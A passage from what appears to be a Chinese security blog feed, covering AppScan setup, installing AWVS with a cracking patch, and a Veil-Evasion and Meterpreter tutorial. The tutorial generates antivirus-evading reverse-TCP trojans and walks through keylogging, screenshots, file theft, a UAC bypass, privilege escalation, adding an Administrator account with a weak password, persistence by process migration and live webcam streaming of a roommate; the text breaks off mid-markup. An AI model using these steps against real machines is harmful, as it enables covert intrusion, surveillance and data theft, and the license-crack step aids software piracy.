src="https://img-blog.csdnimg.cn/20200404231053180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.把覆盖文件里的东西放进C:\Program Files (x86)\IBM\AppScan Standard，并双击9.0.3.7_iFix003-Update进行更新appscan</p><p><img src="https://img-blog.csdnimg.cn/20200404231116616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231155890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231224708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">  </p><h2 id="0x01-AppScan-–-创建扫描任务"><a href="#0x01-AppScan-–-创建扫描任务" class="headerlink" title="0x01 AppScan – 创建扫描任务"></a>0x01 AppScan – 创建扫描任务</h2><p>文件 –&gt;新建–&gt;选择扫描方式–&gt;下一步–&gt;输入站点–&gt;策略文件选择“缺省值”–&gt;启动全面扫描–&gt;完成</p><p><img src="https://img-blog.csdnimg.cn/20200404231714341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231815447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404231903405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404231929870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232043923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232126579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232244159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232403520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404232507404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞扫描工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web漏洞扫描器 - Appscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞扫描器 - awvs</title>
      <link href="/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20awvs/"/>
      <url>/2020/04/18/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%20-%20awvs/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Web漏洞扫描-–-简介"><a href="#0x00-Web漏洞扫描-–-简介" class="headerlink" title="0x00 Web漏洞扫描 – 简介"></a>0x00 Web漏洞扫描 – 简介</h2><p>一、 漏洞扫描</p><p>  漏洞扫描是指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p><p>二、 Web漏洞扫描器<br>  针对于Web应用程序所开发的漏洞扫描器，例如SQL注入、XSS跨站脚本攻击等常见漏洞，进行主动式扫描探测是否存在漏洞。Web漏洞扫描器之间也有区别，例如对于XSS漏洞测试的扫描器，商业的漏洞扫描器和非商业性的漏洞扫描器。</p><p>   通过扫描器能够快速的发现漏洞，来提升我们的效率，以及漏洞覆盖面。</p><p>Web扫描器也是在为我们做信息收集、为接下来的渗透测试做准备</p><h2 id="0x01-AWVS简介"><a href="#0x01-AWVS简介" class="headerlink" title="0x01 AWVS简介"></a>0x01 AWVS简介</h2><p><img src="https://img-blog.csdnimg.cn/20200404195813489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-安装Linux-AWVS"><a href="#0x02-安装Linux-AWVS" class="headerlink" title="0x02 安装Linux AWVS"></a>0x02 安装Linux AWVS</h2><p>1.首先在root目录下<code>新建awvs文件夹</code>，然后把已经下载好的压缩包移动进去。<br><img src="https://img-blog.csdnimg.cn/20200404200044743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2.给<code>acunetix_trial.sh</code>文件分配最高权限。<br><img src="https://img-blog.csdnimg.cn/20200404200211879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3.安装配置<br><code>./acunetix_trial.sh</code>命令进行安装，然后回车，然后会显示一些说明，我们直接<code>ctrl+c</code>退出。接下来我们输入yes,然后就会出现主机名命名,邮箱（登录的用户名）设置，还有密码设置。输入完相应条件，等待安装即可。<br><img src="https://img-blog.csdnimg.cn/20200404201037447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404201118860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.这时候我们就可以打开浏览器<code>登录awvs扫描工具</code>了。<br><img src="https://img-blog.csdnimg.cn/20200404201543493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404201418411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">然后发现当前还是试用版，还没激活，这时候就需要使用补丁进行破解。把文件<code>patch_awvs</code>复制到<code>/home/acunetix</code>/.acunetix_trial/v_190325161/scanner/下，并且赋予<code>patch_awvs</code>破解补丁最高权限，<code>./patch_awvs</code>命令进行激活<br><img src="https://img-blog.csdnimg.cn/20200404201914104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200404202321347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">重新刷新页面，发现已经成功破解了。<br><img src="https://img-blog.csdnimg.cn/20200404202615969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200404202520767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞扫描工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web漏洞扫描器 - awvs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>veil工具的使用&amp;控制meterpreter会话</title>
      <link href="/2020/04/18/%E5%85%8D%E6%9D%80payload%E6%94%BB%E5%87%BB&amp;%E6%8E%A7%E5%88%B6meterpreter%E4%BC%9A%E8%AF%9D/"/>
      <url>/2020/04/18/%E5%85%8D%E6%9D%80payload%E6%94%BB%E5%87%BB&amp;%E6%8E%A7%E5%88%B6meterpreter%E4%BC%9A%E8%AF%9D/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-veil-Evasion的简介"><a href="#0x00-veil-Evasion的简介" class="headerlink" title="0x00 veil Evasion的简介"></a>0x00 veil Evasion的简介</h2><p>kali linux提供了一款名为veil Evasion的工具，可以生成不同类型的攻击载荷文件。其中，该攻击载荷文件在大多数情况下能绕过常见的杀毒软件。</p><p><img src="https://img-blog.csdnimg.cn/20200411103251553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x01-使用Veil-Evasion工具生成免杀载荷文件"><a href="#0x01-使用Veil-Evasion工具生成免杀载荷文件" class="headerlink" title="0x01 使用Veil Evasion工具生成免杀载荷文件"></a>0x01 使用Veil Evasion工具生成免杀载荷文件</h2><p>使用Evasion工具。执行命令如下：<br><img src="https://img-blog.csdnimg.cn/20200411103529649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看Evaasion工具支持的攻击载荷，执行命令如下。<br><img src="https://img-blog.csdnimg.cn/20200411103836774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200411103905481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">然后可以看到veil工具支持的攻击载荷。例如，这里选择用cs/meterpreter/rev_tcp.py攻击载荷，执行命令如下：<br><img src="https://img-blog.csdnimg.cn/20200411104224648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从以上输出信息发现，没有配置lhost选项，配置lhost选项，生成攻击载荷。<br><img src="https://img-blog.csdnimg.cn/2020041110474998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这时候就生成木马文件了，发送到目标主机运行就可以了。同样，还需要一个监听器，当目标执行木马文件的时候，将主动与攻击机建立连接。使用metasploit的exploit/multi/handler模块创建监听器，命令如下：<br><img src="https://img-blog.csdnimg.cn/20200411105654700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200411105818362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">当目标双击运行了木马文件，那么我们就可以获取到一个远程会话。<br><img src="https://img-blog.csdnimg.cn/20200411110020888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">此时，用户可以在meterpreter shell下执行大量的命令。用户可以使用help查看支持的所有命令。<br><img src="https://img-blog.csdnimg.cn/20200411110326414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200411110401434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/202004111104319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200411110503742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200411110538636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从meterpreter会话返回到msf终端，执行命令如下：<br><img src="https://img-blog.csdnimg.cn/20200411111212734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-控制meterpreter会话"><a href="#0x02-控制meterpreter会话" class="headerlink" title="0x02 控制meterpreter会话!"></a>0x02 控制meterpreter会话!</h2><p>当渗透测试者利用某漏洞成功渗透到目标系统，并且获取到Meterpreter会话后，可以<br>利用其漏洞模块支持的Meterpreter命令来控制Meterpreter会话，以获取目标主机的更多<br>信息或控制目标主机，如关闭杀毒软件、键盘捕获、屏幕截图、提升权限及创建账户等。</p><h2 id="获取目标的详细信息"><a href="#获取目标的详细信息" class="headerlink" title="获取目标的详细信息"></a><strong>获取目标的详细信息</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： sysinfo</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200411113423901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">还可以</p><h2 id="使用run-scraper命令查看目标主机的详细信息"><a href="#使用run-scraper命令查看目标主机的详细信息" class="headerlink" title="使用run scraper命令查看目标主机的详细信息"></a>使用run scraper命令查看目标主机的详细信息</h2><p>然后下载到本地，执行命令如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper</span><br></pre></td></tr></table></figure><p>从输出信息可以看到，已获得到目标主机的详细信息，而且，将获得到的信息下载并保存到了本地的C:\Users\74292\AppData\Local\Temp\目录中，这些信息以windows注册表文件形式保存。<br><img src="https://img-blog.csdnimg.cn/20200411113813806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="检查目标是否运行在虚拟机"><a href="#检查目标是否运行在虚拟机" class="headerlink" title="检查目标是否运行在虚拟机"></a>检查目标是否运行在虚拟机</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200411114326780.png" alt="在这里插入图片描述"></p><h2 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h2><p>(1)使用pwd查看当前工作目录<br><img src="https://img-blog.csdnimg.cn/20200411114655799.png" alt="在这里插入图片描述"><br>(2)使用ls查看当前目录的文件<br><img src="https://img-blog.csdnimg.cn/20200411114807525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)(3)使用rm命令删除desktop.inip文件，然后执行了命令并没有输出任何信息，使用ls再次查看文件列表，确定是否已经删除了。<br><img src="https://img-blog.csdnimg.cn/20200411115028570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（4）切换工作目录<br>cd..执行这条命令将切换到上级目录，即C:\Users\74292</p><p><img src="https://img-blog.csdnimg.cn/20200411115233614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（5）创建一个名为test的目录<br><img src="https://img-blog.csdnimg.cn/20200411115407722.png" alt="在这里插入图片描述"></p><h2 id="0x03-上传-下载文件"><a href="#0x03-上传-下载文件" class="headerlink" title="0x03 上传/下载文件"></a>0x03 上传/下载文件</h2><p>在Meterpreter会话中，用户还可以实现文件的上传和下载。下载文件语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download file</span><br></pre></td></tr></table></figure><p>上传文件语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload file</span><br></pre></td></tr></table></figure><p>从目标主机下载pictures文件，命令如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download Pictures</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200411120010119.png" alt="在这里插入图片描述">将本地的shell.txt上传到目标主机，执行命令如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload shell.txt</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200411120152744.png" alt="在这里插入图片描述">使用ls命令查看当前文件列表，已确认上传文件成功。<br><img src="https://img-blog.csdnimg.cn/20200411120335188.png" alt="在这里插入图片描述"></p><h2 id="键盘捕获"><a href="#键盘捕获" class="headerlink" title="键盘捕获"></a>键盘捕获</h2><p>启动键盘捕获</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start</span><br></pre></td></tr></table></figure><p>捕获输入信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_dump</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200411120654901.png" alt="在这里插入图片描述"><br>这时候就获得到我们在记事本上输入的信息。<br><img src="https://img-blog.csdnimg.cn/20200411120802307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">如果我们不想捕获目标主机数据时，可以停止捕获。<br><img src="https://img-blog.csdnimg.cn/20200411121014800.png" alt="在这里插入图片描述"></p><h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： screenshot</span><br></pre></td></tr></table></figure><p>截取了目标主机的屏幕，并且保存到 /root/桌面/pNZXkovO.jpeg<br><img src="https://img-blog.csdnimg.cn/20200411121131196.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200411121328928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="枚举用户"><a href="#枚举用户" class="headerlink" title="枚举用户"></a>枚举用户</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：run post/windows/gather/enum_logged_on_users</span><br></pre></td></tr></table></figure><p>目标主机只有一个用户，用户名：Administrator<br><img src="https://img-blog.csdnimg.cn/20200411121526526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>对普通用户提权。查看当前用户的权限信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令： getuid</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200411121750304.png" alt="在这里插入图片描述"><br>使用getsystem命令对用户进行提权。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令：  getsystem</span><br></pre></td></tr></table></figure><p>然后发现提升权限失败。<br><img src="https://img-blog.csdnimg.cn/20200411121928277.png" alt="在这里插入图片描述">输入background隐藏此界面，然后使用UAC模块进一步提权</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt; <span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">bypassuac_eventvwr</span></span><br><span class="line"><span class="title">msf5</span> <span class="title">exploit</span>(<span class="title">bypassuac</span>) &gt; <span class="title">set</span> <span class="title">session</span> 2</span><br><span class="line"><span class="title">msf5</span> <span class="title">exploit</span>(<span class="title">bypassuac</span>) &gt; <span class="title">exploit</span></span><br><span class="line">然会生成另一个<span class="title">session</span>，可以进行提权操作了，提权过程中并不需要设置端口号了，默认4444即可</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020041113084495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们再次尝试从普通用户提权到管理员，这时候发现还是失败了，再执行一次getsystem命令，发现成功了。<br><img src="https://img-blog.csdnimg.cn/20200411130720815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">首先对方的开启远程连接设置<br><img src="https://img-blog.csdnimg.cn/20200411131521982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再输入shell,进入cmd命令，然后查看用户net user，并新建用户net user Administrator 123456,新建完成后，我们就可以远程连接。<br><img src="https://img-blog.csdnimg.cn/20200411131901938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200411132131869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看有没有摄像头：webcam_list<br><img src="https://img-blog.csdnimg.cn/20200411133004676.png" alt="在这里插入图片描述"><br>摄像头拍照片：webcam_snap<br><img src="https://img-blog.csdnimg.cn/20200411133032353.png" alt="在这里插入图片描述"><br>开启摄像头直播：webcam_stream（这是我帅气的舍友）<br><img src="https://img-blog.csdnimg.cn/20200411133049184.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200411133100438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="绑定进程"><a href="#绑定进程" class="headerlink" title="绑定进程"></a>绑定进程</h2><p>Meterpreter既可以单独运行，也可以与其他进程进行绑定。当Meterpreter 单独作为一<br>个进程运行时，很容易破发现。如果将它与系统中经常运行的进程进行绑定，就能够实现<br>持久化。</p><p>（1）查看当前进程<br><img src="https://img-blog.csdnimg.cn/20200411144355230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">（2）使用getpid查看当前的进程，然后再使用migrate 4064命令绑定进程。<br><img src="https://img-blog.csdnimg.cn/20200411144545313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="运行程序"><a href="#运行程序" class="headerlink" 